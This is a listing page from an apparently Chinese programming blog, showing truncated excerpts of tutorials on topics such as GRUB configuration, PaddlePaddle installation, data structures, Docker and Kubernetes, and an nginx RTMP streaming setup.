		lwk@mint19:~$ cat /etc/default/grub # If you change this file, run 'update-grub' afterwards to update # /boot/grub/grub.cfg. # For full documentation of the options in this file, see: # info -f grub -n 'Simple configuration' GRUB_DEFAULT=0 GRUB_HIDDEN_TIMEOUT=0 GRUB_HIDDEN_TIMEOUT_QUIET=true GRUB_TIMEOUT=10 GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian` GRUB_CMDLINE_LINUX_DEFAULT="quiet splash" GRUB_CMDLINE_LINUX="" # Uncomment to enable BadRAM filtering, modify to suit your needs # This works with Linux (no patch required) and with any kernel that obtains # the memory map information from GRUB (GNU Mach, kernel of FreeBSD .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b14bf0578cd3b74ee6890f1a37bfbfc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d2743f32ff86436e51d162f1019819b/" rel="bookmark">
			《PaddlePaddle从入门到炼丹》一——新版本PaddlePaddle的安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 这一章我们介绍如何安装新版本的PaddlePaddle，这里说的新版本主要是说Fluid版本。Fluid 是设计用来让用户像Pytorch和Tensorflow Eager Execution一样执行程序。在这些系统中，不再有模型这个概念，应用也不再包含一个用于描述Operator图或者一系列层的符号描述，而是像通用程序那样描述训练或者预测的过程。也就是说PaddlePaddle从Fluid版本开始使用动态图机制，所以我们这个系列也是使用Fluid版本编写的教程。
环境 系统：64位Windows 10专业版，64位Ubuntu 16.04Python环境：Python 3.5内存：8G Windows下安装 PaddlePaddle在1.2版本之后开始支持Windows，也就是说使用Windows的用户不需要再安装Docker容器，或者使用Windows的Liunx子系统，直接可以在Windows系统本身安装PaddlePaddle。下面我们就介绍如何在Windows安装PaddlePaddle，分为两个部分介绍，首先安装Python 3.5环境，然后再使用命令安装PaddlePaddle。
安装Python 1、本系列使用的是Python 3.5，官方在Windows上支持Python2.7.15，Python3.5.x，Python3.6.x，Python3.7.x。读者根据自己的实际情况安装自己喜欢的版本。官网下载页面：https://www.python.org/downloads/windows/ ，官网下载地址：https://www.python.org/ftp/python/3.5.4/python-3.5.4-amd64.exe
2、双击运行Python 3.5安装包开始安装，记住要选上添加环境变量，这很重要，之后使用命令都要依赖这个环境变量，要不每次都要进入到pip的目录比较麻烦。然后点击Install Now开始安装。
3、安装完成之后，测试安装是否成功，打开Windows PowerShell或者cmd，笔者的系统是Windows 10，可以使用Windows PowerShell，如果读者是其他系统，可以使用cmd。用命令python -V查看是否安装成功。正常安装之后可以显示安装Python的版本。
安装PaddlePaddle PaddlePaddle支持Windows之后，安装起来非常简单，只需要一条命令就可以完成安装。
安装CPU版本，打开Windows PowerShell，输入以下命令。可以使用==指定安装PaddlePaddle的版本，如没有指定版本，默认安装是最新版本。-i后面是镜像源地址，使用国内镜像源可以大大提高下载速度： pip3 install paddlepaddle==1.4.1 -i https://mirrors.aliyun.com/pypi/simple/ 安装GPU版本，目前支持Windows的CUDA 8.0 cuDNN v7的GPU版本 pip3 install paddlepaddle-gpu==1.4.1 -i https://mirrors.aliyun.com/pypi/simple/ 测试安装是否成功，在Windows PowerShell中输入命令python，进入到Python 编辑环境，并输入以下代码，导没有保存证明安装成功： import paddle.fluid Ubuntu下安装 下面介绍在Ubuntu系统下安装PaddlePaddle，PaddlePaddle支持64位的Ubuntu 14.04 /16.04 /18.04系统，Python支持Python2.7.15，Python3.5.x，Python3.6.x，Python3.7.x。
安装Python 3.5（通常不需要执行）。通常情况下Ubuntu 16.04自带的就是Python 3.5，其他Ubuntu的版本自带的可能是其他版本，不过没有关系，PaddlePaddle基本都支持，所以不必专门安装Python3.5。 sudo apt install python3.5 sudo apt install python3.5-dev 安装CPU版本，打开Ubuntu的终端，快捷键是Ctrl+Alt+T，输入以下命令。可以使用==指定安装PaddlePaddle的版本，如没有指定版本，默认安装是最新版本。-i后面是镜像源地址，使用国内镜像源可以大大提高下载速度： pip3 install paddlepaddle==1.4.1 -i https://mirrors.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d2743f32ff86436e51d162f1019819b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74d30f6a0e4254885b89691ede264234/" rel="bookmark">
			数据结构学习之——线性表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、线性表的定义和基本操作 1.1、线性表的定义 线性表是具有相同数据类型的n个数据元素的有限序列，其中n为表长，当n=0时线性表是一个空表。若以L命名，则表示为
L = ( a 1 , a 2 , , ⋯ , a i , a i + 1 , ⋯ , a n ) L=\left(a_{1}, a_{2,},\cdots, a_{i}, a_{i+1}, \cdots, a_{n}\right) L=(a1​,a2,​,⋯,ai​,ai+1​,⋯,an​)
a 1 a_{1} a1​是唯一的“第一个”元素，又称表头元素； a n a_{n} an​是唯一的“最后一个”元素，又称表尾元素除第一个元素外，每个元素有且仅有一个直接前驱。除最后一个元素外，每个元素有且仅有一个直接后继。
线性表的特性：
表中元素的个数有限。表中元素具有逻辑上的顺序性，表中元素有其先后次序。表中元素都是数据元素，每个元素都是单个元素。表中元素的数据类型都相同，这意味着每个元素占有相同大小的存储空间。表中元素具有抽象性，即仅讨论元素间的逻辑关系，而不考虑元素究竟表示什么内容。 注意：线性表是一种逻辑结构，表示元素之间一对一的相邻关系。根据存储结构的不同可分为顺序表和链表。
1.2、线性表的基本操作 InitList(&amp;L):初始化表。构造一个空的线性表。Length (L)：求表长。返回线性表L的长度，即L中数据元素的个数。LocateElem(L,e)：按值查找操作。在表L中查找具有给定关键字值的元素。GetElem(L,i):按位查找操作。获取表L中第i个位置的元素的值。Listinsert (&amp;L, i, e)：插入操作。在表L中的第i个位置上插入指定元素e。ListDelete (&amp;L, i, &amp;e):删除操作。删除表L中第i个位置的元素，并用e返回删除元素的值。PrintList(L)：输出操作。按前后顺序输出线性表L的所有元素值。Empty (L):判空操作。若L为空表，则返回true,否则返回false。DestroyList(&amp;L)：销毁操作。销毁线性表，并释放线性表L所占用的内存空间。 2、线性表的顺序表示 2.1、顺序表的定义 定义：线性表的顺序存储又称顺序表。它是用一组地址连续的存储单元依次存储线性表中的数据元素，从而使得逻辑上相邻的两个元素在物理位置上也相邻。
位序：第1个元素存储在线性表的起始位置,第i个元素的存储位置后面紧接着存储的是第i+1个元素，称i为元素 a i a_{i} ai​在线性表中的位序。因此，顺序表的特点是表中元素的逻辑顺序与其物理顺序相同。
线性表的顺序存储如下所示：
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-5yu7FLsk-1685022761721)(./2_1.png)]
随机存储：每个数据元素的存储位置都和线性表的起始位置相差一个和该数据元素的位序成正比的常数，因此，顺序表中的任意一个数据元素都可以随机存取，所以线性表的顺序存储结构是一种随机存取的存储结构。通常用高级程序设计语言中的数组来描述线性表的顺序存储结构。
内存分配方式：一维数组的内存分配方式有静态分配和动态分配。在静态分配时，由于数组的大小和空间事先已经固定，一旦空间占满，再加入新的数据就会产生溢出，进而导致程序崩溃。 而在动态分配时，存储数组的空间是在程序执行过程中通过动态存储分配语句分配的，一旦数据空间占满，就另外开辟一块更大的存储空间，用以替换原来的存储空间，从而达到扩充存储数组空间的目的，而不需要为线性表一次性地划分所有空间。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74d30f6a0e4254885b89691ede264234/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/feb3193f9e07d47443c763af3cec5732/" rel="bookmark">
			软件测试基础知识整理（八）- 软件缺陷
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、软件缺陷
1.1 缺陷定义
1.2 缺陷判定标准
1.3 软件缺陷产生的原因
1.4 软件缺陷产生的根源
1.5 软件缺陷信息
1.5.1 缺陷状态
1.5.2 缺陷严重程度
1.5.3 缺陷优先级
1.6 缺陷报告模板
1.7 缺陷报告注意事项
1.8 缺陷跟踪流程
1.9 缺陷数据分析关注的问题 一、软件缺陷 1.1 缺陷定义 软件或者程序中存在的各种问题。
1.2 缺陷判定标准 软件没有达到需求说明书标明的功能。软件出现了需求说明书指明不会出现错误的地方。软件超出了需求说明书指明的范围。软件出现了需求说明书虽未指明，但应该达到的目标。软件难以使用，效率低下。 1.3 软件缺陷产生的原因 需求解释、记录或者定义错误。设计文档说明存在错误或者拼写错误。编码说明、程序代码有误。硬件或者软件系统上存在错误。 1.4 软件缺陷产生的根源 需求变更交流不充分软件的复杂性进度压力 1.5 软件缺陷信息 编号属性名描述1缺陷ID唯一的缺陷ID，可根据该ID追踪缺陷。2缺陷状态缺陷状态指缺陷通过跟踪修复的进展情况。3缺陷标题描述缺陷标题4缺陷严重程度对软件产品的影响程度，分致命、较严重、严重、一般、低5缺陷优先级缺陷修复的先后顺序6缺陷所属模块缺陷所属的项目和模块，要较能精准的定位至模块7缺陷记录者提交缺陷的人员8缺陷提交时间缺陷提交的时间9缺陷处理人处理缺陷的处理人10处理结果描述对处理结果的描述，描述处理情况和代码修改情况11缺陷处理时间缺陷处理的时间12缺陷验证人对被处理缺陷验证的验证人（回测者）13验证结果描述对验证结果的描述（通过、不通过）14缺陷详细描述缺陷的重现步骤15缺陷环境说明对测试环境的描述16必要附件如涉及到附件的火错误现象的图片等 1.5.1 缺陷状态 缺陷状态表 缺陷状态描述New（待提交）缺陷刚被发现并报告，但还没有被分配或处理。Open（待确认）缺陷已被提交，并等待处理。Fixed（已修复）缺陷已被开发人员修复。Cloesed（已关闭）缺陷修复已完成，并确认不再需要进一步的处理。Reopen（重新打开）在经过验证后，缺陷再次出现或相关问题未解决，导致需要重新处理。Postpone（延期处理）缺陷修复的处理被延期，通常是由于优先级较低或其他原因导致。Reject（被拒绝）缺陷被测试团队或相关负责人员拒绝处理，通常是由于误报或不符合缺陷定义的情况。Duplicate（重复缺陷）已存在相同或类似的缺陷报告。Abandon（放弃处理）缺陷被认为无法或不必修复。 1.5.2 缺陷严重程度 缺陷严重程度表 严重等级描述致命错误（Critical）缺陷导致的系统崩溃、数据丢失或不可用，以及严重的安全漏洞。严重错误（High）系统主要功能部分缺失，数据不能保存，系统所提供的功能或者服务受到明显影响。一般错误（Medium）系统次要功能没有完全实现，但不影响用户正常使用。（仅仅影响一个相对独立的功能，或者特定条件上发生）较小（Low） 操作不方便或遇到麻烦，但不影响系统功能操作和执行（例如：错别字，文字排列不整齐等一系列小问题）
1.5.3 缺陷优先级 缺陷优先级表 优先级别描述立即解决（Urgent）缺陷导致系统用不能使用或者测试不能继续，需立即修复。高优先级（High）缺陷严重，影响测试，需优先考虑。正常排队（Medium）缺陷正常排队等待修复。低优先级（Low）缺陷可以在有时间的时候被纠正。 1.6 缺陷报告模板 ID功能模块严重程度优先等级BUG类型测试环境状态缺陷描述预置条件重现步骤期望结果实际结果附件图片/日志测试人员开发人员解决方案创建日期解决日期QQLog_01登录致命立即功能错误win10newQQ账号登录提示账号不存在QQ账号正确 1.打开QQ
2.输入账号密码
3.点击登录按钮
QQ账号登录成功，进入QQ主界面提示“账号不存在”....................................... 注意：不同公司对于缺陷的严重程度和优先级有不同的代码表示，例如：S1（致命缺陷），P0（立即修复）等。
1.7 缺陷报告注意事项 缺陷报告不能有缺陷表达和描述简洁、准确一个缺陷一个报告缺陷一定是可重现的避免出现模糊的词汇不能有个人感情色彩出现bug过程一定要详细 1.8 缺陷跟踪流程 新提交的缺陷为新建状态（New），确认有效后为待确认状态（Open），经过开发人员修改后，缺陷变为已修复（Fixed）状态，此时就需要测试人员对缺陷进行回归测试，验证问题是否修复。如果问题已经修复，则测试人员将该缺陷的状态置为关闭状态（Closed），同时添加回测说明如“该缺陷已解决”。如果已经关闭的问题再次出现，则测试人员将该缺陷状态修改为重新打开。 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/feb3193f9e07d47443c763af3cec5732/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d774a7f9e7682fd5d834b6e1259246c1/" rel="bookmark">
			jsonschema fge json-schema-validator 高级能力 自定义类校验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		入参校验产品化 schema_个人渣记录仅为自己搜索用的博客-CSDN博客
自定义的string format可以使用. 详见 fpe的 addFormatValidator
ajv 的 addFormat能力
借鉴自chatgpt, 谷歌了半天,没看到好答案.
Q: "jsonschema 自定义 object 校验"
A: 如下
2014年后未更新 &lt;dependency&gt;
&lt;groupId&gt;com.github.fge&lt;/groupId&gt;
&lt;artifactId&gt;json-schema-validator&lt;/artifactId&gt;
&lt;version&gt;2.2.14&lt;/version&gt;
&lt;/dependency&gt;
创建自定义AbstractKeywordValidator 要自定义 JSON Schema 中的对象校验，您需要编写一个自定义验证器。以下是一个示例，它定义了一个名为“myObject”的自定义对象校验，该校验验证对象是否包含一个名为“foo”的属性：
import com.fasterxml.jackson.databind.JsonNode; import com.github.fge.jsonschema.core.exceptions.ProcessingException; import com.github.fge.jsonschema.core.report.ProcessingReport; import com.github.fge.jsonschema.core.util.Dictionary; import com.github.fge.jsonschema.keyword.validator.AbstractKeywordValidator; public class MyObjectValidator extends AbstractKeywordValidator { private static final Dictionary&lt;String&gt; messages = messages(); public MyObjectValidator(final JsonNode digest) { super("myObject"); } @Override public void validate(final ProcessingReport report, final JsonNode schema, final JsonNode instance) throws ProcessingException { if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d774a7f9e7682fd5d834b6e1259246c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79e3147578e29e267931c203622a7e5b/" rel="bookmark">
			Docker圣经：大白话说Docker底层原理，6W字实现Docker自由
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说在前面： 现在拿到offer超级难，甚至连面试电话，一个都搞不到。
尼恩的技术社群（50+）中，很多小伙伴凭借 “左手云原生+右手大数据”的绝活，拿到了offer，并且是非常优质的offer，据说年终奖都足足18个月。
而云原生的核心组件是 Docker + K8S，但是 Docker 又很难。在这里，尼恩从架构师视角出发，Docker + K8S 核心原理做一个宏观的介绍。
由于内容确实太多， 所以写两个pdf 电子书，并且后续会持续升级：
(1) 《 Docker 学习圣经 》PDF
(2) 《 K8S 学习圣经 》PDF
带大家穿透Docker + K8S ，实现Docker + K8S 自由，让大家不迷路。
本书 《 Docker 学习圣经 》PDF的 V1版本，后面会持续迭代和升级。供后面的小伙伴参考，提升大家的 3高 架构、设计、开发水平。
注：本文以 PDF 持续更新，最新尼恩 架构笔记、面试题 的PDF文件，请从这里获取：码云
《 Docker 学习圣经 》PDF 封面 本文目录 文章目录 说在前面：《 Docker 学习圣经 》PDF 封面本文目录Docker基础Docker 巨大的价值Docker 的本质:Docker的广泛应用场景：Docker的在DevOps（开发、运维）场景的应用Docker 的历史 Docker 的入门知识Docker EngineDocker Platform到底什么是docker：什么是容器？docker基本组成Docker 与虚拟机有何区别docker和kvm都是虚拟化技术，它们的主要差别：与传统VM特性对比：docker 与操作系统比较 Docker 的安装环境准备docker安装的三种方式方式一 ：离线安装docker方式二 ：在线安装docker方式三 ：用现成的 （大大的省事） Docker Container概述什么是Container 容器容器与镜像的关系 Docker本地容器相关的操作Container相关命令创建容器查看活跃容器 docker ps查看全部容器停止容器删除容器查看容器的进程信息如何查找容器名称?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79e3147578e29e267931c203622a7e5b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/983f6a3ea1342035adbb85aab5a51604/" rel="bookmark">
			K8S学习圣经：大白话说K8S底层原理，14W字实现K8S自由
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kubernets 底层原理和实操 (学习圣经) Kubernets 简称 k8s，用于自动部署，扩展和管理容器化应用程序的开源系统。也就是能帮我们部署和管理分布式系统。
学习 Kubernets 的相关资料 中文官网：https://kubernetes.io/zh-cn/docs/
官方文档：https://kubernetes.io/zh/docs/home/（推荐）
中文社区：https://www.kubernetes.org.cn/
社区文档：http://docs.kubernetes.org.cn/
Kubernetes API 规约：community/api-conventions.md at master · kubernetes/community (github.com)
Kubernetes kubectl 命令表: http://docs.kubernetes.org.cn/683.html
说在前面： 现在拿到offer超级难，甚至连面试电话，一个都搞不到。
尼恩的技术社群中（50+），很多小伙伴凭借 “左手云原生+右手大数据”的绝活，拿到了offer，并且是非常优质的offer，据说年终奖都足足18个月。
从Java高薪岗位和就业岗位来看，K8S 现在对于 高级工程师， 架构师，越来越重要，下面是一个高薪Java岗位的K8S技能要求：
但是 K8S 又很难。在这里，尼恩从架构师视角出发，基于自己的尼恩Java 架构师知识体系和知识宇宙，对K8S的核心原理做一个宏观的介绍， 一共十二部分， 组成一本《K8S学习圣经》
《K8S学习圣经》 带大家穿透K8S，实现K8S自由，让大家不迷路。
《K8S学习圣经》的组成 第一部分：云原生(Cloud Native)的原理与演进第二部分：穿透K8S的8大宏观架构第三部分：最小化K8s环境实操第四部分：Kubernetes 基本概念第五部分：Kubernetes 工作负载第六部分：Kubernetes 的资源控制第七部分: SVC负载均衡底层原理第八部分: Ingress底层原理和实操第九部分： 蓝绿发布、金丝雀发布、滚动发布、A/B测试 实操第十部分： 服务网格Service Mesh 宏观架构模式和实操第十一部分： 使用K8S+Harber 手动部署 Springboot 应用第十二部分： SpringCloud+Jenkins+ K8s Ingress 自动化灰度发布第十三部分： k8s springboot 生产实践（高可用部署、基于qps动态扩缩容、prometheus监控）第十四部分：k8s生产环境容器内部JVM参数配置解析及优化 米饭要一口一口的吃，不能急。
结合《K8S学习圣经》，尼恩从架构师视角出发，左手云原生+右手大数据 +SpringCloud Alibaba 微服务 核心原理做一个宏观的介绍。由于内容确实太多， 所以写多个pdf 电子书：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/983f6a3ea1342035adbb85aab5a51604/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22a5389f19bdfc96bb0ff7c9c3bb9804/" rel="bookmark">
			vite pwa项目使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pwa介绍：
PWA(Progressive Web App):就是一种网页应用，可以离线使用，变成独立应用安装到系统中。
渐进式网页应用
是一种基于网页的应用，但它和传统的Web App有些不同，以下是不同点：
离线&amp;轻量
离线可用 跟普通的网页没啥区别，加载飞快，启动飞快
轻量不需要去App Store来安装
PWA是一个依赖于浏览器的应用，浏览器拿不到的权限它都别想拿到，对隐私是很有保障
原理：
vite-plugin-pwa vite-plugin-pwa是vite的一个官方插件，它的功能就是通过简单的配置将你的vite项目变成pwa应用，其关于service worker的实现直接采用的谷歌开源库workbox，workbox内部帮你对缓存做了大量的逻辑代码处理，并且也支持非常多种不同的缓存策略，并且也封装好了sw.js文件的更新策略，另外它的配置也非常简单。有时候站在巨人的肩膀上是更好的一种选择。
使用
安装
yarn add vite-plugin-pwa --dev 接着在vite-config.js中配置好就行
VitePWA({ registerType: 'autoUpdate', includeAssets: ['favicon.svg'], manifest: { name: '哈哈哈哈哈哈', short_name: 'Vitesse', theme_color: '#ff0', icons: [ { src: '/pwa-192x192.png', sizes: '192x192', type: 'image/png', }, { src: '/pwa-512x512.png', sizes: '512x512', type: 'image/png', }, { src: '/pwa-512x512.png', sizes: '512x512', type: 'image/png', purpose: 'any maskable', }, ], }, devOptions: { enabled: true, }, }), 效果图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe47cce8a88a0d2b6624342344d81bee/" rel="bookmark">
			赛灵思-Zynq UltraScale&#43; MPSoC：QT与OPENCV交叉编译环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 赛灵思-Zynq UltraScale+ MPSoC：QT与OPENCV交叉编译环境搭建 1、MPSOC 交叉编译环境简介 使用Linux交叉编译工具在开发中可以摆脱对petalinux的依赖，直接使用Linux交叉编译工具进行编译，可以使开发更加便捷。
由于获取Linux编译工具链需要用petalinux构建SDK，然后安装SDK，为了避免开发QT和OPENCV时需要再重新构建安装SDK，所以通常会将QT和OPENCV直接打包进SDK，SDK其实指的是软件开发工具集，与petalinux构建的跟文件系统有很大关心，里面包含了petalinux构建的根文件系统，各种库和头文件，还包含Linux交叉编译工具链，用来编译Linux及Linux应用使其能再ZYNQ MPSOC的PS端运行。
2、交叉编译环境的搭建流程 2.1、配置petalinux根文件系统 1、进入petalinux工程目录下，使用petalinux命令配置rootfs
petalinux-config -c rootfs 2、进入Fielsystem Packages -&gt; misc -&gt; gdb；勾选 gdb和gdbserver，gdb用来调试应用程序，gdbserver可以通过网络远程调试应用程序。
3、进入Petalinux Package Groups -&gt; package Groups -&gt; packagegroup-petalinux-matchbox;勾选packagegroup-petalinux-matchbox，matchbox是一种简易的Linux桌面管理系统。
4、进入 Petalinux Package Groups -&gt; packagegroup-petalinux-opencv,勾选packagegroup-petalinux-opencv;
5、进入Petalinux Package Groups -&gt; packagegroup-petalinux-qt,勾选 packagegroup-petalinux-qt，配置qt库。
6、进入Petalinux Package Groups -&gt; packagegroup-petalinux-v4lutils，勾选 packagegroup-petalinux-v4lutils，配置视频工具库v4l2。
7、进入Petalinux Package Groups -&gt; packagegroup-petalinux-x11，勾选 packagegroup-petalinux-x11，配置x11库。
8、进入FielsystemPackages -&gt; libs -&gt; libmail-xlnx，勾选 libmail-xlnx，配置GPU库。
9、选择&lt; Save &gt;，保存所有配置，然后退出配置界面，使用命令编译petalinux工程
petalinux-build 10、生成BOOT.bin文件
petalinux-package --boot --u-boot --fsbl --force 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c9a29a1db0d3590b8b3edd70d750a0b/" rel="bookmark">
			mybatisPlus自动填充表的创建人、创建时间、修改人、修改时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、共有字段父类 import com.baomidou.mybatisplus.annotation.FieldFill; import com.baomidou.mybatisplus.annotation.TableField; import lombok.Data; import java.util.Date; @Data public class BaseEntity{ /** * 创建时间 */ @TableField(value = "create_time", fill = FieldFill.INSERT) private Date createTime; /** * 更新时间 */ @TableField(value = "update_time", fill = FieldFill.INSERT_UPDATE) private Date updateTime; /** * 创建人 */ @TableField(value = "create_by", fill = FieldFill.INSERT) private Long createBy; /** * 更新人 */ @TableField(value = "update_by", fill = FieldFill.INSERT_UPDATE) private Long updateBy; } 二、实体类继承共有字段的类 import java.io.Serializable; import com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c9a29a1db0d3590b8b3edd70d750a0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/467d245e20265d85add705b6dfe9cc5a/" rel="bookmark">
			ptp4l测试-LinuxPTP\ptp4l配置与问题排查
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前言
1.1 什么是ptp4l
1.2 描述
1.3 官网连接
1.4 目的
1.5 平台
二、 平台必要软件
2.1 linux物理机
2.2 imx6ull开发板
三、检查硬件是否支持
3.1 ifconfig查看当前网卡的名称
3.2 ethtool检查驱动和网卡是否支持
四、开启ptp4l服务
4.1 方法一：官方推荐方法开启ptp4l服务
4.2 方法二：执行摸索的开启ptp4l服务（虚拟机平台）
一、前言 1.1 什么是ptp4l ptp4l - PTP普通时钟/边界时钟/透明时钟协议栈 1.2 描述 ptp4l是一个Linux上PTP协议（IEEE 1588）的实现，支持普通时钟，边界时钟和透明时钟。 1.3 官网连接 Configuring PTP Using ptp4l :: Fedora Docs (fedoraproject.org) 1.4 目的 配置ptp4l进行测试时，发现存在一些问题导致无法正常进行测试，下面对遇到的问题进行排查解决。 1.5 平台 master-linux物理机。 slave-linux虚拟机。确保双方能ping通。 二、 平台必要软件 2.1 linux物理机 1、安装ethtool 2、安装ptp4l 2.2 imx6ull开发板 //1、imx6ull支持IEEE 1588协议 //2、内核配置ptp时钟 //3、交叉编译或通过buildroot等安装ptp4l （后续补充） 三、检查硬件是否支持 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/467d245e20265d85add705b6dfe9cc5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c29d458d05bb24a0d0335472ab3a6962/" rel="bookmark">
			二叉搜索树的插入和删除
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		typedef int ElementType; struct TreeNode; typedef struct TreeNode *Position; typedef struct TreeNode *SearchTree; struct TreeNode { ElementType element; SearchTree Left; SearTree Right; }; Position FindMin(SearchTree T) { if(T == NULL) return NULL; else if(T-&gt;Left == NULL) return T; else return FindMin(T-&gt;Left); } SearchTree Insert(ElementType X, SearchTree T) { if(T == NULL) { T = (TreeNode*)malloc(sizeof(struct TreeNode)); if (T == NULL) fataerror("out of space!"); else { T-&gt;element = X; T-&gt;Left = T-&gt;Right = NULL; } } else if(X&lt;T-&gt;element) T-&gt;Left = Insert(X, T-&gt;Left); else if (X &gt; T-&gt;element) T-&gt;Right = Insert(X, T-&gt;Right); return T; } SearchTree Delete(ElementType X, SearchTree T) { Position TempCell; if(T == NULL) Error("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c29d458d05bb24a0d0335472ab3a6962/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b658df5f7c5465a7e3e0a7f73d3d291c/" rel="bookmark">
			【FFH】OpenHarmony——ArkTs应用开发&#43;正则表达式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【FFH】OpenHarmony——ArkTs应用开发+正则表达式 文章目录 【FFH】OpenHarmony——ArkTs应用开发+正则表达式1. 前言——系列介绍2. 本文摘要及背景2.1 摘要2.2 背景2.3 MindMap 3. 正则表达式在ArkTs的使用3.1 变量 RegExp3.2 使用3.3 贪婪模式与懒惰模式:eye_speech_bubble:ArkTs 正则表达式 懒惰模式 4. 正则表达式应用4.1 ArkTs应用——网络数据过滤 参考资料 1. 前言——系列介绍 本系列文章主要是记录笔者在鸿蒙领域的学习与工作中的知识点笔记记录，其中不止会针对鸿蒙中的学习问题进行思考与记录，也会对涉及到的一些嵌入式等其他领域进行记录。
目前该系列已发布的内容有：
【FFH】开源鸿蒙南向嵌入学习笔记——NAPI框架学习（一）-开源基础软件社区-51CTO.COM 2. 本文摘要及背景 2.1 摘要 本文最核心❇️ ：在做（开源）鸿蒙应用开发时，ArkTs中使用正则表达式处理像string等字符串对象。介绍一些ArkTs使用正则表达式示例，以及一些可能比较常用的小技巧✴️ 。介绍正则表达式的一些应用技巧，涉及到匹配模式。正则表达式在开源鸿蒙应用开发中，可以起到怎样的一个应用。 2.2 背景 黄同学最近在做OpenHarmony 应用开发的时候，遇到了一些场景，我需要从像string 这样的字符串数据中，获取我需要的特定信息。传统的解决方式：相信我的读者可能都有一些DS的基础，知道这种其实就是字符串匹配问题，针对这种问题，常见的解法是使用：暴力匹配、KMP、AC自动机等方式，但是在实际应用当中如果这样做，可能比较蠢。黄同学此前有过在Python中使用过具有正则表达（式）匹配功能的 re 模块的经历。但是ArkTs 并没有类似的集成API。但是在ArkTs 的相关文档以及文章中，对这一块的描述都比较少。但是从官方的描述来看，我们可以知道 ArkTs 是 TypeScript 和 JavaScript 的超集，兼容了JS/TS的语言生态。所以黄同学在写这篇文章的时候，看了不少JS和TS关于正则表达式的使用的文档。 2.3 MindMap 3. 正则表达式在ArkTs的使用 3.1 变量 RegExp 在ArkTs 中，正则表达式的变量类型是RegExp，这一点基本上兼容了JS。
有两种表达方式
可以用斜杠来包住正则表达式，里边就是正则表达式的内容。
let rep: RegExp = /a\S+b/; 也可以用RegExp的构造函数来构造，需要传入string作为参数
let rep = new RegExp("a\S+b"); 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b658df5f7c5465a7e3e0a7f73d3d291c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dabcbf7f94e5b98b3eb1e37f35c13e8d/" rel="bookmark">
			用nginx实现一个直播服务—RTMP推流和HTTP-FLV拉流
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、环境准备
二、安装编译nginx所需的安装包和下载nginx原代码包
三、nginx配置
四、启动nginx服务
五、测试推流和拉流服务
六、摄像头数据采集
七、查看统计
这篇文章主要记录用nginx实现直播服务，通过RTMP推流和通过HTTP-FLV或RTMP拉流，并在页面中播放。
一、环境准备 CentOS Linux release 7.3.1611 (Core) 3.10.0-514.el7.x86_64
nginx1.25
二、安装编译nginx所需的安装包和下载nginx原代码包 #安装编译nginx环境包
yum install gcc -y yum install pcre pcre-devel -y yum install openssl openssl-devel -y yum install wget -y #下载nginx和nginx-http-flv-module原代码
